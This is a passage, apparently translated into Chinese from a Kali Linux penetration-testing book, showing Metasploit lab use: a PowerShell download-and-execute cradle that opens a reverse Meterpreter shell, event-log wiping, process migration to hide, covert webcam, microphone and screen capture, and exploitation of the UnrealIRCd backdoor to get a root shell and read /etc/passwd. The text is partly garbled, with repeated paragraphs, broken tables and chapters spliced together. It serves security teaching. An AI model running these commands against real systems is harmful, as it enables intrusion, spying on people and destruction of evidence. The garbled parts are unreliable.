Metasploit 能够完成许多不同的事情；我们只是粗略地过了一些基础的核心功能。Web Delivery 模块非常有用，因为你可以通过简单更改目标类型来获取 Windows、Linux 和 Mac 系统的 shell（这在我的《使用 Kali Linux 进行中级安全测试 2》一书中中有有详细介绍）。再次，如果你在这一刻感到迷茫，请不要恐慌！我们将在稍后以更详细的细节再次涵盖整个 Meterpreter 漏洞利用过程。接下来，我们将讨论 Meterpreter shell，这是一个神奇且有趣的界面，我们可以用它来操纵已成功利用的系统。

## 资源

- https://www.offensive-security.com/metasploit-unleashed/
- https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
- https://cve.mitre.org/
- https://technet.microsoft.com/en-us/security/bulletins
- https://en.wikipedia.org/wiki/EternalBlue
- https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_01_eternalblue

# 第 8 章

## Meterpreter Shell

Meterpreter shell 通常比标准的远程终端 shell 更受欢迎。Meterpreter 为我们提供了一系列可以运行的命令和工具，可以极大协助安全测试。成功利用后，Meterpreter shell 允许你执行许多不同的功能。它非常适合操纵目标系统，甚至可以使用被攻破的主机攻击同一网络上的其他主机。取决于你的目标，Meterpreter Shell 通常是首选方案。例如，在使用 Meterpreter 时，有命令可以拉取密码哈希值并从目标中收集数据和设置。Meterpreter 中还包含了一些有趣的工具，例如你可以使用目标机的摄像头、麦克风，甚至截取用户正在操作的桌面截图。使用内置命令和插件模块，可以对目标系统实现相当完全的控制。

在本节中，我们将讨论 Meterpreter shell 及其的一些特性。

## 基础 Meterpreter 命令

对于本章，我们需要一个远程 Meterpreter shell 连接到 Windows 7 系统。为了简单起见，将使用与上一章相同的 Web Delivery 模块。注意：在本书编写期间，Windows Defender 开始检测并拦截 Web Delivery。如果你运行的是更新版本的 defender，WebDelivery 将不起。我将重复以下步骤：

1. 启动 Metasploit Framework。
2. 在 msf 提示符输入输入命令：
   a. use exploit/multi/web_delivery
   b. set target 2
   c. set payload windows/meterpreter/reverse_tcp
   d. set LHOST 192.168.1.39
   e. set LPORT 4444
   f. exploit

所示：
```bash
msf > exploit/multi/web_delivery
msf exploit(multi/web_delivery) > set target 2
msf exploit(multi/web_delivery) > set payload windows/meterpreter/reverse/tcp
msf exploit(multi/web_delivery) > set LHOST 192.168.1.39
msf exploit(multi/web_delivery) > set LPORT 4444
msf exploit(multi/web_delivery) > exploit
Exploit running as background job 0.
[*] Started TCP handler on 192.168.1.39:4444
msf exploit(multi/web_delivery) > Using URL: http://0.0.0.0:8080
[*] Local IP: 192.168.1.39:8080
[*] Server started.
[*] 在目标上运行以下命令：
powershell.exe -nop -w hidden -c $z=new-object net.webclient;$z.proxy=[Net.WebRequest]::GetProxy();$z.Credentials=[Net.Credential]::DefaultCredential;IEX $z.downloadstring('http://192.168.1.39:8080');

``` Windows 7 系统上，打开命令提示符，粘贴 PowerShell 命令并运行：

```
msf exploit(multi/web_delivery) > 192.168.1.93 web_delivery - Delivered Payload
[*] Staging stage (179799 bytes) to 192.168.1.93
[*] Meterpreter session 1 opened (192.168.1.93:4444) -> 192.168.1.93:49159) at 2018-05-17 15:46:27 -0400
msf exploit(multi/web_delivery) >
```

5. 现在输入 "sessions" 查看生成的会话。

6. 然后输入 "sessions -i 1" 获取与目标的交互会话：

```bash
msf exploit(multi/web_delivery) > sessions
Active sessions
--------------
Id Name Type             Information                 Connection
1  meterpreter x86/windows WIN-420R3VF:Dan @ WIN-420R3VF 192.168.1.39
   4444 -> 192.168.1.93:49159 (192.168.1.93)
msf exploit(multi/web_delivery) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

连接到会话后，我们得到了 Meterpreter 提示符。让我们开始使用 "help" 命令查看可用命令，看看 Meterpreter 可以做什么：

```
meterpreter > help
```

当我们这样做时，可以看到命令被分为不同的章节。命令有：

字体 核心命令 (Core Commands)
- 文件系统命令 (File System Commands)
- 网络命令 (Networking Commands)
- 系统命令 (System Commands)
- 用户界面命令 (User Interface Commands)
- 摄像头命令 (Webcam Commands)
- 以及权限命令 (Priv Commands)

我们不会涵盖所有的命令章节，但将查看其中几个。阅读所有章节以对它们的功能有一个基本的理解是。

### 核心命令

| 命令 | 说明 |
| --- | --- |
| ? | 帮助菜单 |
| background | 将当前会话放入后台 |
| bgkill | 杀死后台 meterpreter 脚本 |
| bglist | 列出运行中的后台脚本 |
| bgrun | 在后台执行 meterpreter 脚本 |
| channel | 显示信息或控制访问 |
| close | 关闭通道 |
| disable_unicode_encoding | 禁用 unicode 字符串编码 |
| enable_unicode_encoding | 启用 unicode 字符串编码 |
| exit | 终止 meterpreter 会话 |
| get_timeouts | 获取当前的超时值 |
| guid | 获取会话 GUID |
| help | 帮助菜单 |

初级用户可能只会使用列表中的 background, help, load, migrate 和 exit。

**Background** - 允许你将会话放入后台，这样你就可以返回 msf 提示符或其他访问会话：

```
meterpreter > background
[*] Background session 1...
msf exploit(multi) >
```

你只需使用“session -i <session #>”命令即可返回你的会话。

- **“Load”和“Run”** – 这些命令允许你在 Meterpreter 内部使用额外的模块和命令。

- **Migrate** – 允许你将 Meterpreter shell 移动到不同的进程。这在你以后想要变得更隐蔽或想要不同的访问级别时可能非常有用。

- **Exit** – 退出 Meterpreter。

### 文件系统命令

当你拥有 Meterpreter shell 时，你基本上在处理两个独立的文件系统，本地系统和远程系统。Meterpreter 文件系统命令允许你与以下内容交互：



### Stdpi: 文件系统命令

| 命令 | 描述 |
| --- | --- |
| cat | 读取文件内容到终端 |
| cd | 切换目录 |
| checksum | 获取文件的校验和 |
| cp | 将源文件复制到目标 |
| dir | 列出文件 (ls 的别名) |
| download | 下载文件或目录 |
| edit | 编辑文件 |
| getwld | 打印本地工作目录 |
| getwd | 打印工作目录 |
| lcd | 切换本地工作目录 |
| lls | 列出本地文件 |
| pwd | 打印本地工作目录 |
| ls | 列出文件 |

基本上，我们使用标准的 Linux 命令在本地系统和远程系统之间切换和区分。但你如何区分自己正处于 Meterpreter shell 中呢？当你处于 Meterpreter 时，这些命令被认为是在远程系统上使用的。例如，要获取远程系统的目录列表，只需使用“ls”命令即可：

```
meterpreter > ls
Listing: C:\Users\Dan
| Mode | Size | Type | Last modified | Name |
| --- | --- | --- | --- | --- |
| 4077/rwxxrwrwx | 0 | dir | 2015-01-06 09:59:36 -0500 | AppData |
| 4077/rwxxrwrwx | 0 | dir | 2015-01-06 09:59:36 -0500 | Application |
| 40555/r-xrxr-x | 0 | dir | 2015-01-06 10:01:29 -0500 | Contacts |
| 4077/rwxxrwrwx | 0 | dir | 2015-01-06 09:59:36 -0500 | Cookies |
| 40559/r-xr-x | 4096 | dir | 2015-08-04 16:00:35 -0400 | Desktop |
| 40553/r-xrxr-x | 4096 | dir | 2015-03-19 15:49:34 -0400 | Documents |
| 40553/r-xrxr-x | 4096 | dir | 2015-03-23 15:12:29 -0400 | DownLoads |
```

如果在远程机器上创建一个名为“test”的目录，我们可以进入该目录并列出内容：

```
meterpreter > mkdir test
Creating directory: test
meterpreter > cd test
meterpreter > ls
No entries exist in C:\Users\Dan\test
meterpreter > |
```

当我们需要在你的 Kali 文件系统中移动时，可以使用以下命令：

- getlwd & ipwd - 获取（显示）本地工作目录
- lcd - 切换本地目录
- ls - 列出本地文件

所以，如果我们需要检查本地工作目录然后切换到 Kali 系统的 Desktop 目录，可以如下操作：

```
meterpreter > lpwd
/root
meterpreter > lcd Desktop
meterpreter > getlwd
/root/Desktop
meterpreter > |
```

“download”命令允许你从目标系统下载文件，反之，“upload”命令允许你将文件发送到远程系统。如果你想上传文件，可以连接到所需的本地和远程目录，然后带有要发送的文件名执行上传命令。例如，如果我在 Kali Desktop 上有一个名为“Tools”的文件（这是我为本示例创建的文本文件），并将其复制到目标系统，我可以像下面一样上传：

```
meterpreter > lpwd
/root
meterpreter > lcd Desktop
meterpreter > getlwd
/root/Desktop
meterpreter >
meterpreter > lpwd
/root/Desktop
meterpreter > pwd
C:\Users\Dan\test
[*] uploading : Tools -> Tools
[*] uploaded 5.00-B of 5.00 (100.0%): Tools -> Tools
[*] uploaded : Tools -> Tools
meterpreter > ls
Listing: C:\Users\Dan\test
```

| Mode | Size | Last modified | Name |
| --- | --- | --- | --- |
| 100666/rw-rw- | 5 | fil | 2018-05-17 16:28:12 -0400 | Tools |

我首先检查了是否位于 Tools 文件所在的 Kali 机器 Desktop 目录。然后我验证了已连接到目标的“test”目录，并简单地使用“upload”命令传输文件。

下载的原理相同，只需使用“download”命令和文件名从远程系统拉取文件并存储在你的本地 Kali 机器上。如果我们在远程机器上看到一个名为“AccountInfo.txt”的有趣文件，我们可以像下面所示下载它：

```
meterpreter > download AccountInfo.txt
[*] Downloading: AccountInfo.txt -> AccountInfo.txt
[*] Downloaded 4.0 B of 4.0 B (100.0): AccountInfo.txt -> AccountInfo.txt
[*] Download : AccountInfo.txt
meterpreter > ls
Listing: /root
```

正如上面所示，我首先检查了是否位于 Tools 文件的 Kali 机器 Desktop 目录。然后我验证了已连接到目标的“test”目录，并简单地使用“upload”命令传输文件。

下载的原理相同，只需使用“download”命令和文件名从远程系统拉取文件并存储在你的本地 Kali 机器上。如果我们在远程机器上看到一个名为“AccountInfo.txt”的有趣文件，我们可以像下面所示下载它：

```
meterpreter > download AccountInfo.txt
[*] Downloading: AccountInfo.txt -> AccountInfo.txt
[*] Downloaded 4.0 B of 4.0 B (100.0): AccountInfo.txt -> AccountInfo.txt
[*] Download : AccountInfo.txt
meterpreter > ls
Listing: /root
```

正如上面所示，我首先检查了是否位于 Tools 文件的 Kali 机器 Desktop 目录。然后我验证了已连接到目标的“test”目录，并简单地使用“upload”命令传输文件。

## 网络命令

| 命令 | 描述 |
| --- | --- |
| arp | Display ARP cache |
| getproxy | Display current proxy configuration |
| ifconfig | Display interfaces |
| ipconfig | Display interfaces |
| netstat | Display network connections |
| portforward | Forward a port to remote service |
| resolve | Resolve a set of host names |
| route | View route table |

**arp** - 显示远程 IP 地址列表。

**ifconfig & ipconfig** - 显示远程系统的网络接口。

**netstat** - 显示活动连接。

**portwd & route** - 允许进行某些路由攻击。虽然我们不在书中介绍，但可以显示路由。

## 系统命令

| 命令 | 描述 |
| --- | --- |
| clear | Clear the log |
| drop_token | Relinquishes any token |
| execute | Executes a command |
| getenv | Get environment variables |
| getpid | Get process identifier |
| getprivs | Attempt to enable privileges |
| getuid | Get the user |
| kill | Terminate a process |
| localtime | Displays local date and time |
| grep | Filter by name |
| ps | List processes |

某些事件可能是我们，攻击者执行的操作。我们可以使用“clearev”命令清除日志。但有一个问题，如果我们用高权限账户运行此命令（稍后会介绍），我们将收到错误且命令执行失败：

```
meterpreter > clearev
[*] Wiping 1369 records from Application...
[-] stdapi_sys_eventlog_clear: Operation failed: Access is denied.
```

如果我们使用加密会话，“clearev”将成功清除日志，如下所示：

```
meterpreter > clearev
[*] Wiping 2578 records from Application...
[*] Wiping 7033 records from System...
[*] Wiping 2512 records from Security...
meterpreter >
```

应用程序、系统和安全日志已清除所有记录。如果我们再次查看安全日志，它显示了一个记录，“日志清除”：

| 安全 | 日期和时间 | 源 | 事件 ID | 任务类别 |
|---|---|---|---|---|
| Audit Success | 3/18/2016 10:00:40 | Eventlog | 1102 | Log clear |

显然这对于任何分析日志的人来说都会非常显眼。但如果某些事件被你删除了，只要你有足够的权限，这就是实现的方法。

**GETPID & PS 命令** – 在使用 Meterpreter 时，你常用的两个命令是 getpid 和 ps。

- getpid - 列出你的 shell 运行的进程 ID
- ps - 列出远程系统上运行的所有进程

如果你有一个活动的 meterpreter 会话并输入“getpid”，你会看到类似的内容：

```
meterpreter > getpid
Current pid: 2260
```

这是你的 shell 使用的进程 ID 数字（数字会变化）。你可以使用“ps”命令查看目标系统上的所有活动进程：



```
meterpreter > ps
Process List
======
```

| PID | PPID | Name | Arch |
|---|---|---|---|
| 0 | 0 | [System Process] | |
| 4 | 0 | System | x86 |
| 272 | 4 | smss.exe | x86 |
| 364 | 4 | csrss.exe | x86 |
| 416 | 4 | wininit.exe | x86 |
| 420 | 408 | csrss.exe | x86 |
| 476 | 408 | winlogon.exe | x86 |
| 524 | 416 | services.exe | x86 |
| 532 | 416 | lsass.exe | x86 |
| 540 | 416 | lsm.exe | x86 |
| 648 | 524 | svchost.exe | x86 |
```

如果我们正在一个 'powershell.exe' 下运行，寻找 PID 为 2260 的进程，我们看到如下：

```
2260 2180 powershell.exe x86 1 WIN-42ORBM3SRV Fidan
C:\Windows\System32\PowerShellv1.0\powershell.exe
```

这表明我们以用户 'Dari' 的身份运行在 'powershell.exe' 进程下。当我们想要从这个低级进程“迁移”（migrate）到一个具有更高权限的进程时，这些信息就非常有用。我们可以使用 `migrate` 命令将 shell 从此进程移动到更高权限的进程或更稳定的进程。迁移还允许我们将 shell 合并并隐藏到另一个常用进程中，本质上是隐藏了我们的连接。Explorer.exe 是最常迁移到的常用进程之一。

只需找到你想要使用的进程 PID#（在我们的系统中是 2336），然后按如下所示输入 'migrate <PID#>'：

```
meterpreter > migrate 2336
[*] Migrating from 2260 to 2336...
[*] Migration completed successfully.
meterpreter > getpid
Current current pid: 2336
```

我们将在后面的章节中进一步讨论迁移以及一些关于 Meterpreter 命令。现在，让我们来谈谈截图和使用远程摄像头！

## 注意：

通过虚拟机捕捉 USB 摄像头和麦克风是一个有些碰运气的问题。你会得到参差不齐的结果。在本节的某些截图，我使用了一台 Windows 7 笔记本电脑作为目标。

## 捕捉摄像头视频、截图和声音

以前当我听新闻报道时，我记得里面一直在报道一种全新的 APT（高级持续性威胁），它是如此先进，以实际上可以允许攻击者打开你的摄像头并录音。我觉得这完全是荒谬的，因为多年来你可以用 Metasploit 做到这一点了。

## 摄像头命令

有几个可用的摄像头命令：

| 命令 | 说明 |
| --- | --- |
| record_mic | 从默认麦克风录制 X 秒音频 |
| webcam_chat | 开始视频聊天 |
| webcam_list | 列出摄像头 |
| webcam_snap | 从指定的摄像头拍摄快照 |
| webcam_stream | 从指定的摄像头播放视频流 |

输入 "webcam_list" 显示目标上的任何可用摄像头：

```
meterpreter > webcam list
1: USB.0 VGA UVC Webcam
```

在我的系统中，我有一个位于数字1的 UVC 摄像头。我们有几个摄像头选项，其中一个是 "webcam_snap"，它通过目标摄像头截图。

```
输入 "webcam_snap -h" 查看可用选项
meterpreter > webcam_snap -h
Usage: webcam_snap [options]

从指定的摄像头捕获帧。

OPTIONS:
-h 帮助横幅
-i <opt> 要使用的摄像头索引（默认: 1）
-p <opt> JPEG 图像路径（默认: 'dwypFkz.jpeg'）
-q <opt> JPEG 图像质量（默认: '50'）
-v <opt> 自动查看 JPEG 图像（默认: 'true'）
```

我们可以使用所有默认值，只需输入 "webcam_snap"：

```
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/UceySrvw.jpeg
meterpreter >
```

这将通过远程摄像头拍摄快照，在 Kali 中显示并保存到指定位置。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_129_0.png)

上面的摄像头截图是我某天拍我猫的真实照片。不知道为什么猫必须睡在笔记本键盘上，但我现在知道是谁在网上订了所有的金枪鱼了……

我们还可以从目标系统查看流视频。

输入 **webcam_stream -h**

```
meterpreter > webcam_stream -h
[*] Starting...
Usage: webcam_stream [options]

从指定的摄像头流式传输。

OPTIONS:
-h <opt> 流的持续时间（秒）（默认: 1000）
  帮助横幅
-i <opt> 要使用的摄像头索引（默认: 1）
-q <opt> 流质量（默认: '50'）
-s <opt> 流文件路径（默认: OUTZ.jpeg）
-t <opt> 流播放器路径（默认: EPly.html）
-v <opt> 自动查看流（默认: 'true'）
```

再次，我们可以直接采取默认选项并运行 "webcam_stream"：

```
meterpreter > webcam_stream
Starting...
Preparing player...
Opening player: knSQa.html
Streaming...
```

浏览器应该打开，我们应该开始看到视频传输到 Kali 系统：

![](img/37a3b7ef116fef991f9e33dd8b348c7_130_0.png)

目标机器上唯一的错误的提示是你的摄像头灯亮了，如果有一个的话。除此之外，你无法判断是否在远程查看你的摄像头。

### 截图

你可以使用 "screenshot" 命令获取目标显示器当前显示的任何内容的快照：

```
meterpreter > screenshot
screens saved to: /root/wn0HZD.jpeg
meterpreter >
```

如果我们打开文件，会看到这个：

![](img/37a3b7ef116fef991f9e33dd8b348c7_131_0.png)

由于，由于系统被后门漏洞感染，似乎我们的明星员工在工作时花宝贵时间玩在线游戏。不错……

### 录音

我们可以使用 Metpreter 录制目标系统的音频。

输入 "record_mic"：

```
meterpreter > record_mic
[*] Starting...
[*] Stopped
Audio saved to: /root/NYaxxvM.wav
```

你可以在 Kali 系统上打开 .wav 文件进行收听。确实，这为你提供了有限的录制时间，但对于在安全或机密环境中的公司来说，这应该是一个启发性的。几年前，我写过一篇文章演示了如何从目标系统恢复音频，然后使用 "Sinn3r" 的脚本来处理音频。
```



## 屏幕间谍 (Screen Spy)

Screen Spy 是一个自动截图程序。它会以固定的间隔捕取 6 张截图。这些截图存储在隐藏的 Meterpreter loot 目录 (`/root/.msf4/loot`) 中。这个脚本非常好用，因为它可以让你看到用户随时间推移的操作。

使用 Screen Spy：

> 输入 "run post/windows/gather/screen_spy"
meterpreter > run post/windows/gather/screen_spy

```
[*] Migrating to explorer.exe pid: 1164
[+] Migration successful
[*] Capturing 6 screenshots with a delay of 5 seconds
[+] Screen Spying Complete
[*] run loot -t screensnpy.screenshot to see file locations
meterpreter >
```

截图会按照定义的间隔自动拍摄并保存。要查看保存的截图：

输入 "background"
然后输入 "loot -t screensnpy.screenshot" 来查看保存的文件的位置。

## meterpreter > background...
[*] Backgrounding session 1...
msf exploit(multi/script/web_delivery) > loot -t screenspy.screenshot
Loot

| host | service | type | content |
| --- | --- | --- | --- |
| 192.168.1.193 | | screenspy.screenshot | screenshot.5.jpg | image/jpg |
| 192.168.1.193 | | screenspy.screenshot | screenshot.4.jpg | image/jpg |
| 192.168.1.193 | | screenspy.screenshot | screenshot.3.jpg | image/jpg |
| 192.168.1.193 | | screenspy.screenshot | screenshot.2.jpg | image/jpg |
| 192.168.1.193 | | screenspy.screenshot | screenshot.1.jpg | image/jpg |
| 192.168.1.193 | | screenspy.screenshot | screenshot.0.jpg | image/jpg |

截图存储在隐藏的 "root/loot" 目录。保持 Metasploit 窗口打开并使用 Kali（文件管理器）查看这些文件。你需要在文件属性中启用“显示隐藏文件夹”才能查看该目录。

![](img/37a3b7ef116f9ef991f9e33dd8b348c7_135_0.png)

在上面的截图中，Meterpreter 连续拍摄了 6 张延迟截图。在截图中，“user”打开了浏览器浏览器并访问了一个网页。使用这个工具可以让我们获得关于目标的一些有用信息、使用习惯，甚至是稍后在我们安全评估中可以使用的数据。

```
msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...
meterpreter >
```

在本节中，我们只简要地介绍了几个脚本。还有许多额外的脚本可以让你尝试。某些脚本可以关闭防病毒软件、禁用目标防火墙、从 Firefox、ftp 程序等多个程序中获取伪证和凭据等等。花点时间检查一下它们。某些脚本确实需要更高级别的权限，我们将在书中后续部分进行介绍。

## 远程 Shell (Remote Shell)

最后，让我们看看如何从目标主机获取真正的 C:\ 提示符。一旦我们有了 Meterpreter 会话，这极其简单。

```
meterpreter > shell
Process 876 created.
Channel 6 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\Dan>
```

就是这样，我们现在可以运行任何需要的 DOS 命令。完成后，输入 "exit" 退出 shell，输入 "exit" 返回 Meterpreter，最后输入一次 "exit" 退出 Metasploit。

## 总结

在本章中，我们学习了关于 Metasploit Meterpreter shell 的很多知识。虽然我们涵盖了使用 shell 的基础知识，但我们只触及了功能的一小部分。希望你能理解为什么获取 Meterpreter shell 比比使用标准的远程访问 shell 多得多的功能。

获取视频和声音可能看起来有些戏剧性，但它们可能非常有用，特别是对于社交工程师而言。例如，通过视频你可以窥视目标的物理环境，甚至可能获取员工工牌图像。录制声音也趣。如果能够在建筑内部放置实时麦克风，社交工程师可以从目标设施中学到很多信息。




添加 "-A" 选项，它将执行操作系统检测并尝试确定服务版本：

```
nmap -sS -Pn -A 192.168.1.68
```

Nmap 将运行一段时间，以尝试检测这些端口上运行的实际服务。几分钟后，你将看到类似下面的屏幕：

| 端口 状态 | 服务 版本 |
| :--- | :--- | :--- |
| 21/tcp | open | ftp vsftpd 2.3.4 |
| ftp-anon: Anonymous FTP login allowed (FTP code 230) |
| ftp-sys: STAT: |
| FTP server status: |
| Connected to 192.168.1.39 |
| Logged in as ftp |
| TYPE: ASCII |
| No session bandwidth limit |
| Session timeout in seconds is 300 |
| Control connection is plain text |
| Data connections will be plain text |
| vsftpd 2.3 - secure, fast, stable |
| End status | |
| 22/tcp | open | OpenSSH 4.7p1 Debian Ubuntu |
| 1024 | 00:0f:ec:c3:5f:6a:74:da:90:24:fa:c4:d5:6c:cd | |
| 23/tcp | open | telnet Linux |
| 2048 | 56:56:24:21:de:f7:2be:ae:61:b1:24:d3:e8:f3 | | |

对于每个端口，我们都能看到端口号、服务类型，甚至是服务软件版本。在上面的图中，我们看到几个普通端口是开放的。在高端口也运行着许多服务；其中一个特别是一个 Unreal 实时聊天 (IRC) 程序：

```
6667/tcp open irc UnrealIRCD
irc-info:
users: 1
servers: 1
lusers: 0
lservers: 0
server: irc.Metasploitable.LAN
version: Unreal3.2.8.1. irc.Metasploitable.LAN
uptime: 0 days, 0:24:59
source ident: nmap
source host: DA055C55.78ED367.FFA64D49.IP
error: closing Link; [192.168.1.39] (Quit
```

通常在今天，我们首先关注攻击主要服务。但我建议查看运行在高端口的服务。更有可能被修补并保持更新的是常见的核心服务，还是某个曾经安装后可能被遗的次要服务？所以，让我们看看在这个 Unreal IRC 服务上能发现什么。

在图片中，我们可以看到软件版本，在此情况下为“Unreal IRC 3.2.8.1”。我们的下一步是针对该软件版本搜索漏洞。只需在 Google 中搜索“Unreal 3.2.8.1 exploits”应该就能解决问题。但既然我们可以用 Metasploit 进行搜索，为什么还要用 Google 呢？

## 攻击 Unreal IRC 服务

让我们运行 Metasploit Framework。再次，此此的最佳方法是点击快速访问菜单栏上的“Metasploit Framework”图标。你也可以在终端提示符处输入“msfconsole”，但你可能还需要启动数据库才能让搜索功能正常工作。

```
0000000000000000 0000000000000000
d000000000000000 0000000000000000a
d000000000000000 fffffffff 000000000000000x
1000000000000000 fffffffff.d 0000000000000001
0000000000000000 fffffffff 0000000000000000
x0000000000000000 0000 0000 0000000000000000
1000000000000000 0000 0000 00000000000000001
0000000000000000 cccxxxx0000 xx 0000.
d0000000000000000 0000000000000000
,kol 0000000000000000 M d00.
ii, 0000000000000000000000000000000000000000000000000,
x0000000000000000,
x0000000000000000,
1000000000000001,
d000=[metasploit v4.16-dev
-- exploits - 1000 auxiliary - 306
-- 523 payloads - 41 encoders - nops
-- Free Metasploit trial: 
```

现在使用“search”命令并粘贴服务名称，如下：

```
msf > search Unreal 3.2.8.1
```

运行此搜索返回：

```
exploit/unix/unreal_ircd_3281_backdoor 2010-06-12 excellent Unreal 3.2.8.1 Backdoor
```

后门的可靠率为“excellent”！这是一个好消息，因为漏洞是根据成功概率和稳定性进行排名的。如果你记得我们在 Metasploit 介绍，攻击漏洞有以下几个步骤：

1. 选择漏洞
2. 设置漏洞
3. 选择载荷
4. 设置载荷
5. 运行漏洞
6. 连接到远程系统

让我们针对 metasploitable 系统通过 unreal 后门执行该过程：

## (1) 选择漏洞

如果我们使用“info”命令，可以找到更多关于我们可能漏洞的**。在 msf 提示符处，输入“info exploit/unix/irc/unreal_ircd_3281_backdoor”。

执行此操作发现了：该模块恶意后门被添加到 Unreal IRC 3.2.8.1 中。该后门存在于 Unreal3.2.8.1.tar.gz 存档，于 2009 年 11 月到 2010 年 6 月 12 日之间。所以，让我们使用这个漏洞并检查它的可用选项：输入“use exploit/unix/irc/unreal_ircd_3281_backdoor”，然后是“show options”，如下：

```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
msf > exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
```

| 名称 | 当前设置 | 需要 | 描述 |
| :--- | :--- | :--- | :--- |
| RHOST | | yes | 目标地址 |
| RPORT | 6667 | yes | 目标端口 (TCP) |

正如我们之前提到的，注意 MSF 提示符发生了变化，并显示我们正在使用 unreal 漏洞。

## (2) 设置漏洞选项

从 show options 命令的结果中可以看出，有很多选项需要设置。我们真正需要做的是设置目标远程主机地址，即我们的 Metasploit 系统：输入“set RHOST 192.168.1.68”。

```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 192.168.1.68
RHOST => 192.168.1.68
```

注意 Metasploit 回显了 RHOST 变量的设置。

## (3) 选择载荷

现在我们设置了目标 IP 地址，我们需要选择载荷。查看所有可能的载荷，只需输入“show payloads”显示所有与该漏洞兼容的载荷：

```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
```

兼容载荷：
| 名称 | 信息 | 描述 |
| :--- | :--- | :--- |
| cmd/unix/bind_perl | normal | Unix Command Shell |
| cmd/unix/bind_perl_ipv6 | normal | Unix Command Shell |
| cmd/unix/bind_ruby | normal | Unix Command Shell |
| cmd/unix/bind_ruby_ipv6 | normal | Unix Command Shell |

不幸的是，它们都是命令 shell。Metpreter shell 比命令 shell 更好，而且我们可以获得更多后渗透利用选项，但目前我们只使用通用 shell。当漏洞利用完成后，这将直接带我们进入目标机的终端 shell。

要设置载荷类型，“set payload cmd/unix/reverse”。

让我们看看我们目前为止设置的内容：类型，“show options”：

```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
Module options (unix/irc/unreal_ircd_3281_backdoor):
Name            Current Setting  Required Description
---------------- ----------------------------------------------------------
RHOST           192.168.1.68      yes        The target address
RPORT           6667             yes        The target port (TCP)
```

```
Payload options (cmd/unix/reverse):
Name            Current Setting  Required Description
---------------- ------------------------------------------------
LHOST                           yes        The listen address
LPORT           4444             yes        The listen port
```

如你所见，我们已经设置了目标 IP 地址，现在有了一个载荷。

## (4) 设置载荷选项

我们快完成了。对于这个载荷，我们只需要做的是设置 LHOST 命令（Kali 系统的 IP 地址）。输入“set LHOST 192.168.1.39”，然后进行最后的“show options”以确保一切都已设置：

```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.1.39
LHOST => 192.168.1.39
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
```

双击并确保你的 RHOST（Metasploitable VM）和 LHOST（Kali VM）值设置正确。

## (5) 运行漏洞




这就是我们利用所需的所有内容，已经准备好执行。

现在只需输入 "exploit":"

```
msfexploit(unix/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.1.39:4444
[*] 192.168.1.68:6667 - Connected to 192.168.1.68:6667...
[*] :irc.Metasploit.LAN NOTICE AUTH *** Looking up your hostname*
[*] 192.168.1.68:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Command: echo pz55bxbFnyQeF8;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from socket...
[*] Reading from socket B
[*] B: "pz55bxbFnyQeF8\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (192.168.1.39:4444 -> 192.168.1.68:44435)
```

利用程序正在运行并打开了一个命令 shell 会话。

## [6] 连接到远程系统

这可能会让人有点困惑，它说打开了一个命令 shell 会话，但你看到的只有一个闪烁的光标。实际上，你正坐在与目标机器连接的远程终端 shell 中！如果你输入 "whoami"，目标系统应该像下面返回 "root"：

```
whoami
root
```

成功了；我们刚刚成功利用了第一个基于 Linux 的系统！Root 用户是 Linux 机器上可以拥有的最高级别用户。所有标准的 Linux 命令在我们获得的 shell 中都可以运行。例如，我们可以显示密码文件的内容：

```
cat /etc/passwd
root:x:0:0:root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin/bin/sh
bin:x:2:2:bin:/bin/sh
sys:x:3:3:sys:/dev/sh
sync:x:4:65534:sync:/bin/sync
games:x:5:60:games:/usr/games/bin/sh
man:x:6:12:man:/var/cache/man
lp:x:7:7:/var/spool/lpd/bin/sh
mail:x:8:8:/var/mail/bin/sh
news:x:9:9:/var/spool/news:/bin/sh
uucp:x:10:10:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin/sh
www-data:x:33:33-data:/var/www:/bin/sh
backup:x:34:34:backup/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:irc:/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/
nbody:x:65534:nobody:nonexistent:/bin/sh
libuid:x:100:101:/var/lib/libuid/bin/sh
dhcp:x:101:102:nonexistent:/bin/sh
```

我们必须破解密码文件才能获取实际密码；我们将在书的稍后的“密码攻击（Password Attacks）”章节中查看此内容。要结束会话，按下 "Ctrl-c"，然后在提示取消会话时按 "y"。接下来输入 "back" 返回到 msf 提示符，如下：

```
stat:x:14:65534:/var/lib/nfs:/bin/false
snmp:x:15:65534:/var/lib/snmp:/bin/false
^

[*] 192.168.1.68 - Command shell session 1 closed. Reason: User exit
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > back
msf =
```

你可以留在 Metasploit 框架中，因为我们将在下一章中用到它。

## 结论

在本章中，我们涵盖了如何使用 Nmap 查找目标系统的开放端口。我们还看到了如何发现这些端口上运行着哪些服务。然后我们讨论了如何针对漏洞服务寻找并使用利用程序。在下一章中，我们将快速查看 Metasploit 内置的一些扫描器，它们可以帮助我们发现并利用特定的服务。

## 资源

https://www.offensive-security.com/metasploit-unleashed/
https://sourceforge.net/projects/metasploitable/
https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide

# 第 10 章
## Metasploitable - 第二部分：扫描器

